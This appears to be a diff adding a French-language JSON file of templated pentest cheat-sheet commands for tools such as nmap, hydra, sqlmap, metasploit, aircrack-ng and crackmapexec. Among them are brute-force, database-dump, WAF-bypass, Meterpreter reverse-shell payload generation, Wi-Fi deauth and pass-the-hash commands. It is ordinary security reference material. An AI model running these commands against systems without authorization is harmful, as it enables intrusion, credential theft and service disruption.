@@ -1,0 +1,200 @@
+{
+  "cheatsheets": [
+    {
+      "tool": "nmap",
+      "category": "Reconnaissance",
+      "description": "Scanner de ports et de services réseau",
+      "commands": [
+        {"title": "Scan rapide top 1000 ports", "cmd": "nmap -T4 -F {TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan complet avec versions", "cmd": "nmap -sV -sC -p- {TARGET}", "vars": ["TARGET"]},
+        {"title": "Détection OS + scripts", "cmd": "nmap -A -O {TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan UDP top 100", "cmd": "nmap -sU --top-ports 100 {TARGET}", "vars": ["TARGET"]},
+        {"title": "Export XML", "cmd": "nmap -oX scan.xml -sV {TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan réseau CIDR", "cmd": "nmap -sn {TARGET}/24", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "hydra",
+      "category": "Exploitation",
+      "description": "Outil de brute-force d'authentification multi-protocoles",
+      "commands": [
+        {"title": "Brute-force SSH", "cmd": "hydra -l {USER} -P {WORDLIST} ssh://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
+        {"title": "Brute-force FTP", "cmd": "hydra -l {USER} -P {WORDLIST} ftp://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
+        {"title": "Brute-force HTTP POST", "cmd": "hydra -l {USER} -P {WORDLIST} {TARGET} http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"", "vars": ["USER","WORDLIST","TARGET"]},
+        {"title": "Brute-force RDP", "cmd": "hydra -l {USER} -P {WORDLIST} rdp://{TARGET}", "vars": ["USER","WORDLIST","TARGET"]},
+        {"title": "Liste d'utilisateurs + mots de passe", "cmd": "hydra -L {USERLIST} -P {WORDLIST} ssh://{TARGET}", "vars": ["USERLIST","WORDLIST","TARGET"]}
+      ]
+    },
+    {
+      "tool": "sqlmap",
+      "category": "Exploitation",
+      "description": "Outil automatisé de détection et exploitation SQL injection",
+      "commands": [
+        {"title": "Test URL basique", "cmd": "sqlmap -u \"{TARGET}\" --batch", "vars": ["TARGET"]},
+        {"title": "Dump base de données", "cmd": "sqlmap -u \"{TARGET}\" --dbs --batch", "vars": ["TARGET"]},
+        {"title": "Dump tables d'une BDD", "cmd": "sqlmap -u \"{TARGET}\" -D {DB} --tables --batch", "vars": ["TARGET","DB"]},
+        {"title": "Dump contenu d'une table", "cmd": "sqlmap -u \"{TARGET}\" -D {DB} -T {TABLE} --dump --batch", "vars": ["TARGET","DB","TABLE"]},
+        {"title": "Test POST form", "cmd": "sqlmap -u \"{TARGET}\" --data=\"user=admin&pass=test\" --batch", "vars": ["TARGET"]},
+        {"title": "Bypass WAF avec tamper", "cmd": "sqlmap -u \"{TARGET}\" --tamper=space2comment --batch", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "gobuster",
+      "category": "Reconnaissance",
+      "description": "Brute-force de répertoires et sous-domaines",
+      "commands": [
+        {"title": "Scan répertoires", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan sous-domaines", "cmd": "gobuster dns -d {TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan avec extensions", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -x php,html,txt", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Scan avec auth Basic", "cmd": "gobuster dir -u http://{TARGET} -w {WORDLIST} -U admin -P {PASSWORD}", "vars": ["TARGET","WORDLIST","PASSWORD"]},
+        {"title": "VHOST fuzzing", "cmd": "gobuster vhost -u http://{TARGET} -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
+      ]
+    },
+    {
+      "tool": "ffuf",
+      "category": "Reconnaissance",
+      "description": "Fast web fuzzer pour répertoires, paramètres et VHOST",
+      "commands": [
+        {"title": "Fuzzing répertoires", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing paramètre GET", "cmd": "ffuf -u http://{TARGET}?FUZZ=test -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing sous-domaines", "cmd": "ffuf -u http://{TARGET} -H \"Host: FUZZ.{TARGET}\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Filtrer par code HTTP", "cmd": "ffuf -u http://{TARGET}/FUZZ -w {WORDLIST} -fc 404", "vars": ["TARGET","WORDLIST"]},
+        {"title": "Fuzzing POST body", "cmd": "ffuf -u http://{TARGET}/login -X POST -d \"user=FUZZ&pass=test\" -w {WORDLIST}", "vars": ["TARGET","WORDLIST"]}
+      ]
+    },
+    {
+      "tool": "metasploit",
+      "category": "Exploitation",
+      "description": "Framework d'exploitation modulaire",
+      "commands": [
+        {"title": "Démarrer msfconsole", "cmd": "msfconsole -q", "vars": []},
+        {"title": "Rechercher un exploit", "cmd": "search type:exploit name:{MODULE}", "vars": ["MODULE"]},
+        {"title": "Utiliser un module", "cmd": "use {MODULE}", "vars": ["MODULE"]},
+        {"title": "Configurer RHOSTS", "cmd": "set RHOSTS {TARGET}", "vars": ["TARGET"]},
+        {"title": "Lancer l'exploit", "cmd": "run", "vars": []},
+        {"title": "Générer payload msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe", "vars": ["LHOST","LPORT"]}
+      ]
+    },
+    {
+      "tool": "nikto",
+      "category": "Reconnaissance",
+      "description": "Scanner de vulnérabilités web",
+      "commands": [
+        {"title": "Scan basique", "cmd": "nikto -h http://{TARGET}", "vars": ["TARGET"]},
+        {"title": "Scan avec port", "cmd": "nikto -h {TARGET} -p {PORT}", "vars": ["TARGET","PORT"]},
+        {"title": "Scan HTTPS", "cmd": "nikto -h https://{TARGET} -ssl", "vars": ["TARGET"]},
+        {"title": "Export rapport HTML", "cmd": "nikto -h http://{TARGET} -o report.html -Format html", "vars": ["TARGET"]},
+        {"title": "Scan avec authentification", "cmd": "nikto -h http://{TARGET} -id admin:{PASSWORD}", "vars": ["TARGET","PASSWORD"]}
+      ]
+    },
+    {
+      "tool": "theHarvester",
+      "category": "OSINT",
+      "description": "OSINT emails, sous-domaines, IPs depuis sources publiques",
+      "commands": [
+        {"title": "Récolte basique", "cmd": "theHarvester -d {TARGET} -b google", "vars": ["TARGET"]},
+        {"title": "Multi-sources", "cmd": "theHarvester -d {TARGET} -b bing,google,yahoo,duckduckgo", "vars": ["TARGET"]},
+        {"title": "Avec DNS brute-force", "cmd": "theHarvester -d {TARGET} -b all -n", "vars": ["TARGET"]},
+        {"title": "Export XML", "cmd": "theHarvester -d {TARGET} -b google -f results", "vars": ["TARGET"]},
+        {"title": "Shodan integration", "cmd": "theHarvester -d {TARGET} -b shodan", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "aircrack-ng",
+      "category": "Réseau",
+      "description": "Suite d'audit de sécurité Wi-Fi",
+      "commands": [
+        {"title": "Mode monitor", "cmd": "airmon-ng start {INTERFACE}", "vars": ["INTERFACE"]},
+        {"title": "Capturer trafic", "cmd": "airodump-ng {INTERFACE}mon", "vars": ["INTERFACE"]},
+        {"title": "Cibler un AP", "cmd": "airodump-ng -c {CHANNEL} --bssid {BSSID} -w capture {INTERFACE}mon", "vars": ["CHANNEL","BSSID","INTERFACE"]},
+        {"title": "Déauth client", "cmd": "aireplay-ng -0 10 -a {BSSID} -c {CLIENT} {INTERFACE}mon", "vars": ["BSSID","CLIENT","INTERFACE"]},
+        {"title": "Cracker WPA2", "cmd": "aircrack-ng -w {WORDLIST} capture-01.cap", "vars": ["WORDLIST"]}
+      ]
+    },
+    {
+      "tool": "john",
+      "category": "Cracking",
+      "description": "John the Ripper — cracker de mots de passe",
+      "commands": [
+        {"title": "Crack basique", "cmd": "john {HASH}", "vars": ["HASH"]},
+        {"title": "Crack avec wordlist", "cmd": "john --wordlist={WORDLIST} {HASH}", "vars": ["WORDLIST","HASH"]},
+        {"title": "Mode règles", "cmd": "john --wordlist={WORDLIST} --rules {HASH}", "vars": ["WORDLIST","HASH"]},
+        {"title": "Afficher mots de passe", "cmd": "john --show {HASH}", "vars": ["HASH"]},
+        {"title": "Format spécifique", "cmd": "john --format={FORMAT} --wordlist={WORDLIST} {HASH}", "vars": ["FORMAT","WORDLIST","HASH"]}
+      ]
+    },
+    {
+      "tool": "crackmapexec",
+      "category": "Post-Exploitation",
+      "description": "Framework de pentest pour Active Directory et SMB",
+      "commands": [
+        {"title": "Enum SMB", "cmd": "crackmapexec smb {TARGET}", "vars": ["TARGET"]},
+        {"title": "Brute-force SMB", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
+        {"title": "Pass-the-Hash", "cmd": "crackmapexec smb {TARGET} -u {USER} -H {HASH}", "vars": ["TARGET","USER","HASH"]},
+        {"title": "Enum shares", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} --shares", "vars": ["TARGET","USER","PASSWORD"]},
+        {"title": "Exécuter commande", "cmd": "crackmapexec smb {TARGET} -u {USER} -p {PASSWORD} -x \"{CMD}\"", "vars": ["TARGET","USER","PASSWORD","CMD"]}
+      ]
+    },
+    {
+      "tool": "volatility3",
+      "category": "Forensic",
+      "description": "Analyse de mémoire volatile (RAM dumps)",
+      "commands": [
+        {"title": "Info système", "cmd": "vol -f {DUMP} windows.info", "vars": ["DUMP"]},
+        {"title": "Liste processus", "cmd": "vol -f {DUMP} windows.pslist", "vars": ["DUMP"]},
+        {"title": "Arbre processus", "cmd": "vol -f {DUMP} windows.pstree", "vars": ["DUMP"]},
+        {"title": "Connexions réseau", "cmd": "vol -f {DUMP} windows.netstat", "vars": ["DUMP"]},
+        {"title": "Dump process", "cmd": "vol -f {DUMP} windows.dumpfiles --pid {PID}", "vars": ["DUMP","PID"]},
+        {"title": "Malfind (code injecté)", "cmd": "vol -f {DUMP} windows.malfind", "vars": ["DUMP"]}
+      ]
+    },
+    {
+      "tool": "yara",
+      "category": "Forensic",
+      "description": "Moteur de règles pour détecter des patterns malveillants",
+      "commands": [
+        {"title": "Scan fichier", "cmd": "yara {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
+        {"title": "Scan répertoire récursif", "cmd": "yara -r {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
+        {"title": "Scan avec strings", "cmd": "yara -s {RULES} {TARGET}", "vars": ["RULES","TARGET"]},
+        {"title": "Compiler règles", "cmd": "yarac {RULES} compiled.yrc", "vars": ["RULES"]},
+        {"title": "Utiliser règles compilées", "cmd": "yara compiled.yrc {TARGET}", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "masscan",
+      "category": "Reconnaissance",
+      "description": "Scanner de ports ultra-rapide pour large surface",
+      "commands": [
+        {"title": "Scan top ports rapide", "cmd": "masscan {TARGET} -p 22,80,443,8080 --rate 1000", "vars": ["TARGET"]},
+        {"title": "Scan tous ports", "cmd": "masscan {TARGET} -p 0-65535 --rate 10000", "vars": ["TARGET"]},
+        {"title": "Scan réseau entier", "cmd": "masscan {TARGET}/24 -p 80,443 --rate 5000", "vars": ["TARGET"]},
+        {"title": "Export JSON", "cmd": "masscan {TARGET} -p 1-1024 --rate 1000 -oJ scan.json", "vars": ["TARGET"]},
+        {"title": "Bannière grabbing", "cmd": "masscan {TARGET} -p 80 --banners --rate 100", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "enum4linux-ng",
+      "category": "Reconnaissance",
+      "description": "Enumération de partages Windows/Samba/LDAP",
+      "commands": [
+        {"title": "Enum complète", "cmd": "enum4linux-ng -A {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum utilisateurs", "cmd": "enum4linux-ng -U {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum shares", "cmd": "enum4linux-ng -S {TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum avec creds", "cmd": "enum4linux-ng -u {USER} -p {PASSWORD} -A {TARGET}", "vars": ["USER","PASSWORD","TARGET"]},
+        {"title": "Export YAML", "cmd": "enum4linux-ng -A {TARGET} -oY results.yaml", "vars": ["TARGET"]}
+      ]
+    },
+    {
+      "tool": "wpscan",
+      "category": "Exploitation",
+      "description": "Scanner de vulnérabilités WordPress",
+      "commands": [
+        {"title": "Scan basique", "cmd": "wpscan --url http://{TARGET}", "vars": ["TARGET"]},
+        {"title": "Enum plugins", "cmd": "wpscan --url http://{TARGET} --enumerate p", "vars": ["TARGET"]},
+        {"title": "Enum utilisateurs", "cmd": "wpscan --url http://{TARGET} --enumerate u", "vars": ["TARGET"]},
+        {"title": "Brute-force comptes", "cmd": "wpscan --url http://{TARGET} -U {USER} -P {WORDLIST}", "vars": ["TARGET","USER","WORDLIST"]},
+        {"title": "Scan avec API token", "cmd": "wpscan --url http://{TARGET} --api-token {TOKEN} --enumerate vp", "vars": ["TARGET","TOKEN"]}
+      ]
+    }
+  ]
+}
